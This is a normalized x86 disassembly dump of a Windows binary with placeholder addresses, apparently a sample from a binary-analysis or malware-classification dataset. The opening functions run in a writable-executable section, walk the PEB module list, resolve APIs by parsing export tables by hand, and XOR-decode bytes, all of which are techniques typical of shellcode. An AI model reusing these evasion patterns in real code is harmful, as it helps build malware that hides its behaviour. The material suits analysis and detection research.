jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_44a0a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_44a130
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_44a160
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x24 ] edx
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x25 ] 0x0
je rwxdata
jmp rwxdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
add ecx [ ebp - 0x10 ]
movzx edx [ ebp - 0x1c ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
jmp rwxdata
mov [ ebp - 0x2c ] 0x0
jmp rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x1 ]
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx + 0x1 ]
jne rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne rwxdata
add [ ebp - 0x24 ] 0x2
add [ ebp - 0x20 ] 0x2
cmp [ ebp - 0x26 ] 0x0
jne rwxdata
mov eax [ ebp - 0x24 ]
mov cl [ eax ]
mov [ ebp - 0x25 ] cl
mov edx [ ebp - 0x20 ]
cmp cl [ edx ]
jne rwxdata
sub_401000
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_40e020
add esp 0x8
retn
sub_401150
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov eax 0x1
retn 0x4
xor eax eax
retn 0x4
cmp [ rw-data ] 0x0
je r-xdata
sub_403210
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
push 0x1
push edx
call sub_40e9e9
add esp 0x10
retn
j_sub_40ed70
jmp sub_40ed70
sub_403240
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push eax
push ecx
call sub_40ee65
add esp 0xc
retn
j_sub_40ee65
jmp sub_40ee65
sub_403270
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_40f008
add esp 0x8
retn
sub_403310
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
push 0x1
push edx
call sub_40eb1e
add esp 0x10
retn
sub_403330
mov eax [ esp + 0x4 ]
add eax 0x1a0
retn
sub_4037e0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov eax [ eax + 0x8c ]
retn
sub_403830
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x90 ]
retn
sub_4038b0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax 0xac44
retn
mov eax [ eax + 0x2c ]
retn
sub_4038d0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax 0x2
retn
mov eax [ eax + 0x1c ]
retn
sub_4038f0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax 0x2
retn
mov eax [ eax + 0xc ]
retn
sub_404060
mov eax r--data
retn
sub_404b10
mov eax [ esp + 0x4 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
jmp sub_403680
jmp sub_4035b0
sub_405710
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov eax [ eax + 0x7c ]
retn
sub_409380
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
sub ecx 0x2
mov [ eax + 0x8 ] ecx
mov [ eax + 0x10 ] 0x1
retn
sub_40a722
add eax 0x5050505
add eax 0x5050505
add eax 0x3050505
add al 0xcc
int3
sub_40ab6a
add eax 0x5050505
add eax 0x5050505
add eax 0x3050505
add al 0xcc
int3
sub_40c810
movsx eax [ esp + 0x4 ]
add eax eax
add eax eax
add eax eax
test eax eax
jle r-xdata
retn
lea ecx [ eax + 0x40 ]
sar ecx 0x7
add eax ecx
sub_40e084
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_40e0aa
push [ esp + 0x4 ]
call sub_40e084
pop ecx
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_40e0bf
push 0x8
call sub_411ef3
pop ecx
retn
sub_40e0c8
push 0x8
call sub_411e1b
pop ecx
retn
sub_40e2c7
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_411e1b
pop ecx
sub_40e2dc
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_40e20e
add esp 0xc
retn
sub_40e2ed
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40e20e
add esp 0xc
retn
sub_40e2fe
push 0x1
push 0x0
push 0x0
call sub_40e20e
add esp 0xc
retn
sub_40e30d
push 0x1
push 0x1
push 0x0
call sub_40e20e
add esp 0xc
retn
sub_40e4ad
push [ ebp + 0x8 ]
call sub_40e5e0
pop ecx
retn
sub_40e56e
call sub_40f49b
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_40fdab
pop ecx
retn
call sub_41387a
sub_40e784
push esi
call sub_40e5e0
pop ecx
retn
sub_40e9df
push [ ebp + 0x18 ]
call sub_40e5e0
pop ecx
retn
sub_40e9e9
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xffffffff
push [ esp + 0x14 ]
call sub_40e922
add esp 0x14
retn
sub_40eba1
push [ ebp + 0x14 ]
call sub_40e5e0
pop ecx
retn
sub_40edd4
push [ ebp + 0x8 ]
call sub_40e5e0
pop ecx
retn
sub_40eee0
push [ ebp + 0x8 ]
call sub_40e5e0
pop ecx
retn
sub_40f070
push [ ebp + 0xc ]
call sub_40e5e0
pop ecx
retn
sub_40f161
push esi
call sub_40e5e0
pop ecx
retn
sub_40f463
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40e60f
pop ecx
pop ecx
retn
sub_40f492
push 0x1
call sub_411e1b
pop ecx
retn
sub_40f49b
push 0x1
call sub_40f3c1
pop ecx
retn
sub_40f4a4
push [ esp + 0x4 ]
call [ FindClose@IAT ]
test eax eax
jne r-xdata
xor eax eax
retn
call sub_412089
mov [ eax ] 0x16
or eax 0xffffffff
retn
sub_40f843
push [ ebp + 0x8 ]
call sub_40e5e0
pop ecx
retn
sub_40f84d
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40f789
add esp 0xc
retn
sub_40f99a
push esi
call sub_40e5e0
pop ecx
retn
sub_40fa1e
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40f9a2
add esp 0x10
retn
sub_40fab0
mov eax sub_4166a8
mov [ rw-data ] eax
mov [ rw-data ] sub_415da4
mov [ rw-data ] sub_415d62
mov [ rw-data ] sub_415d96
mov [ rw-data ] sub_415d0c
mov [ rw-data ] eax
mov [ rw-data ] sub_416622
mov [ rw-data ] sub_415d22
mov [ rw-data ] sub_415c8c
mov [ rw-data ] sub_415c1b
retn
sub_40fb10
call sub_40fab0
call sub_41672e
cmp [ esp + 0x4 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
retn
call sub_4166c9
sub_40fe01
push 0x4
call sub_411e1b
pop ecx
retn
sub_40fe7f
push 0x4
call sub_411e1b
pop ecx
retn
sub_4101a0
push esi
call sub_40e5e0
pop ecx
retn
sub_410244
call sub_40e4b7
add eax 0x20
push eax
push 0x1
call sub_40e60f
pop ecx
pop ecx
retn
sub_410257
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_4103b1
push 0x4
call sub_411e1b
pop ecx
retn
sub_41087e
pop ecx
mov eax 0xff
jmp r-xdata
call sub_412385
retn
sub_4109c6
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x2c ] ecx
push eax
push ecx
call sub_412581
pop ecx
pop ecx
retn
sub_4109da
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
call sub_40e30d
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_412385
retn
push eax
call sub_40e2ed
sub_410a04
call sub_4192b3
jmp sub_41084e
sub_410d55
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_4115ef
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_4116d4
push 0x0
call sub_411671
pop ecx
retn
sub_411740
call [ TlsAlloc@IAT ]
retn 0x4
sub_411749
push [ rw-data ]
call [ TlsGetValue@IAT ]
test eax eax
jne r-xdata
retn
push [ rw-data ]
call sub_4116dd
pop ecx
push eax
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_41185b
push 0xc
call sub_411e1b
pop ecx
retn
sub_411a0b
push 0xd
call sub_411e1b
pop ecx
retn
sub_411a17
push 0xc
call sub_411e1b
pop ecx
retn
sub_411e1b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_411eea
push 0xa
call sub_411e1b
pop ecx
retn
sub_411f24
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_4120af
push esi
call sub_41209c
mov ecx [ esp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_41204e
pop ecx
mov esi eax
call sub_412089
mov [ eax ] esi
pop esi
retn
sub_4121df
call sub_40e0c8
retn
sub_4121e5
push [ esp + 0x4 ]
call sub_4121a9
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_412318
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
sub_412385
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_412536
push 0x8
push r--data
call sub_412340
call sub_4118e7
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_419a61
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_412556
xor eax eax
inc eax
retn
sub_41255a
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419a61
sub_41256f
push sub_412536
call sub_411671
pop ecx
mov [ rw-data ] eax
retn
sub_412580
retn
sub_4126f0
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_41273d
push [ rw-data ]
call sub_4116dd
pop ecx
retn
sub_4128be
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_411e1b
pop ecx
sub_4128fa
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_412904
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_41290e
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_412918
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_4129ae
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_4129c5
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x24 ] 0xc0000017
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_412385
retn
push 0x8
call [ SetLastError@IAT ]
sub_4129ed
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_413740
xor eax eax
inc eax
retn
sub_413910
push 0x1
call sub_411e1b
pop ecx
retn
sub_413919
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_413965
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_41a10f
retn
sub_413996
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_41a220
sub_4142a0
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_4149bd
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_414bcd
push 0xa
call sub_411e1b
pop ecx
retn
sub_414bd6
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_414ccb
push 0xa
call sub_411e1b
pop ecx
retn
sub_414d8e
push 0xb
call sub_411e1b
pop ecx
retn
sub_4151a8
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_41534d
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_415515
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_4155f6
push [ ebp + 0x8 ]
call sub_414bd6
pop ecx
retn
sub_415a24
push 0x1
call sub_411e1b
pop ecx
retn
sub_415b06
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_415a30
add esp 0xc
pop ebp
retn 0x4
sub_415b6c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_415a30
add esp 0xc
pop ebp
retn 0x8
sub_415d0c
fldz
mov eax [ esp + 0x4 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_415d62
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_415d22
add esp 0x10
retn
sub_415d96
push 0x0
push [ esp + 0x8 ]
call sub_415c1b
pop ecx
pop ecx
retn
sub_415da4
push 0x0
push [ esp + 0x8 ]
call sub_415c8c
pop ecx
pop ecx
retn
sub_415fed
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415f1f
add esp 0x18
pop ebp
retn
sub_41683d
and [ rw-data ] 0x0
call sub_41c189
mov [ rw-data ] eax
xor eax eax
retn
sub_416860
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_41687e
leave
retn
sub_416878
movlpd xmm0 [ esp + 0x4 ]
j_sub_416e0b#2
jmp sub_416e0b
sub_416b68
fstp st0
fstp st0
fld [ rw-data ]
mov [ ebp - 0x90 ] 0x2
retn
sub_416b94
mov [ ebp - 0x90 ] 0x2
fstp st0
fld [ rw-data ]
retn
sub_416ba4
or cl cl
jne r-xdata
jmp r-xdata
retn
fstp st0
fld [ rw-data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_416ba9
fldlg2
jmp r-xdata
fxch st1
or cl cl
jne r-xdata
jmp sub_416ea6
fyl2x
retn
sub_416bad
fldln2
fxch st1
or cl cl
jne r-xdata
jmp sub_416ea6
fyl2x
retn
j_sub_416e0b
jmp sub_416e0b
sub_416bf9
fstp st0
jmp r-xdata
fstp st0
fld [ rw-data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_416c2f
fstp st0
fstp st0
fld [ rw-data ]
mov [ ebp - 0x90 ] 0x3
retn
sub_416c41
or cl cl
jne r-xdata
jmp sub_416e06
fstp st0
fld [ rw-data ]
retn
sub_416df8
fxch st1
fstp st0
retn
sub_416e06
fstp st0
fldz
retn
sub_416e0b
fstp st0
fstp st0
fld1
retn
sub_416e12
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fadd [ rw-data ]
retn
mov [ ebp - 0x90 ] 0x7
retn
sub_416e3d
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x90 ] 0x7
jmp r-xdata
faddp st1
retn
sub_416ea6
fstp st0
fstp st0
fld [ rw-data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
sub_416eb9
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_416ec3
or cl cl
je r-xdata
retn
fchs
sub_416ed0
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_416ee5
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_416efc
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x1
retn
mov eax 0x7
retn
sub_416f58
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_418367
push 0xd
call sub_411e1b
pop ecx
retn
sub_4186f6
push 0xd
call sub_411e1b
pop ecx
retn
sub_41872f
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_418595
pop ecx
mov [ rw-data ] 0x1
sub_418a47
push 0xc
call sub_411e1b
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_418e38
xor eax eax
cmp [ esp + 0x8 ] eax
jbe r-xdata
retn
mov ecx [ esp + 0x4 ]
inc eax
inc ecx
cmp eax [ esp + 0x8 ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_419a4f
push 0x4
call sub_411e1b
pop ecx
retn
sub_419a58
push 0x2
call sub_40e060
pop ecx
retn
sub_419d11
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_419bb2
add esp 0x14
retn
sub_419d62
push 0x0
push [ esp + 0x8 ]
call sub_419d2c
pop ecx
pop ecx
retn
sub_419f01
push 0x4
call sub_411e1b
pop ecx
retn
sub_41a0f8
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_419fe5
add esp 0x10
retn
sub_41a4fa
push 0x7
call sub_411e1b
pop ecx
retn
sub_41a973
push 0x6
call sub_411e1b
pop ecx
retn
sub_41a9b4
push 0x6
call sub_411e1b
pop ecx
retn
sub_41aa59
mov eax rw-data
retn
sub_41aa5f
mov eax rw-data
retn
sub_41aa65
mov eax rw-data
retn
sub_41aa6b
mov eax rw-data
retn
sub_41b17b
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41b0af
add esp 0x18
pop ebp
retn
sub_41b3b3
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_41b199
add esp 0xc
retn
sub_41b52f
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_41b3c6
add esp 0x10
retn
sub_41b631
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_41b568
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_41b67c
call eax
retn
sub_41c139
push 0xc
push r--data
call sub_412340
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_412385
retn
sub_41c156
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41c1e9
call sub_41c189
mov [ rw-data ] eax
xor eax eax
retn
sub_41c4b7
sub esp 0x2c
and eax 0x3f
jmp [ eax * 4 + rw-data ]
sub_41c4ca
add esp 0x2c
int 0x6
fdivr st0
add esp 0x2c
retn
sub_41c4d5
add esp 0x2c
int 0x6
fdiv st0
add esp 0x2c
retn
sub_41c4e0
fdivp st0
add esp 0x2c
retn
sub_41c4e6
fdivr st0
add esp 0x2c
retn
sub_41c4ec
fdivrp st0
add esp 0x2c
retn
sub_41c4f2
fstp [ esp + 0xc ]
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fld [ esp + 0x20 ]
fxch st1
add esp 0x2c
retn
sub_41c50e
add esp 0x2c
int 0x6
fstp [ esp ]
fstp [ esp + 0xc ]
call sub_41c3a0
fld [ esp + 0xc ]
fxch st1
add esp 0x2c
retn
sub_41c529
add esp 0x2c
int 0x6
fxch st1
fstp [ esp + 0xc ]
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c54a
fstp [ esp ]
fstp [ esp + 0xc ]
call sub_41c3a0
add esp 0x2c
retn
sub_41c55a
fstp [ esp + 0xc ]
fstp [ esp ]
call sub_41c3a0
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c56e
fstp [ esp + 0xc ]
fstp [ esp ]
call sub_41c3a0
add esp 0x2c
retn
sub_41c57e
fstp [ esp + 0xc ]
fxch st1
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st1
fld [ esp + 0x20 ]
fxch st2
add esp 0x2c
retn
sub_41c59e
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st1
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st1
fld [ esp + 0xc ]
fxch st2
add esp 0x2c
retn
sub_41c5e2
fstp [ esp ]
fxch st1
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st1
add esp 0x2c
retn
sub_41c5f6
fstp [ esp + 0xc ]
fxch st1
fstp [ esp ]
call sub_41c3a0
fxch st1
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c60e
fstp [ esp + 0xc ]
fxch st1
fstp [ esp ]
call sub_41c3a0
fxch st1
add esp 0x2c
retn
sub_41c622
fstp [ esp + 0xc ]
fxch st2
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st2
fld [ esp + 0x20 ]
fxch st3
add esp 0x2c
retn
sub_41c642
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st2
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st2
fld [ esp + 0xc ]
fxch st3
add esp 0x2c
retn
sub_41c686
fstp [ esp ]
fxch st2
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st2
add esp 0x2c
retn
sub_41c69a
fstp [ esp + 0xc ]
fxch st2
fstp [ esp ]
call sub_41c3a0
fxch st2
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c6b2
fstp [ esp + 0xc ]
fxch st2
fstp [ esp ]
call sub_41c3a0
fxch st2
add esp 0x2c
retn
sub_41c6c6
fstp [ esp + 0xc ]
fxch st3
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st3
fld [ esp + 0x20 ]
fxch st4
add esp 0x2c
retn
sub_41c6e6
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st3
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st3
fld [ esp + 0xc ]
fxch st4
add esp 0x2c
retn
sub_41c72a
fstp [ esp ]
fxch st3
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st3
add esp 0x2c
retn
sub_41c73e
fstp [ esp + 0xc ]
fxch st3
fstp [ esp ]
call sub_41c3a0
fxch st3
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c756
fstp [ esp + 0xc ]
fxch st3
fstp [ esp ]
call sub_41c3a0
fxch st3
add esp 0x2c
retn
sub_41c76a
fstp [ esp + 0xc ]
fxch st4
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st4
fld [ esp + 0x20 ]
fxch st5
add esp 0x2c
retn
sub_41c78a
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st4
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st4
fld [ esp + 0xc ]
fxch st5
add esp 0x2c
retn
sub_41c7ce
fstp [ esp ]
fxch st4
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st4
add esp 0x2c
retn
sub_41c7e2
fstp [ esp + 0xc ]
fxch st4
fstp [ esp ]
call sub_41c3a0
fxch st4
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c7fa
fstp [ esp + 0xc ]
fxch st4
fstp [ esp ]
call sub_41c3a0
fxch st4
add esp 0x2c
retn
sub_41c80e
fstp [ esp + 0xc ]
fxch st5
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st5
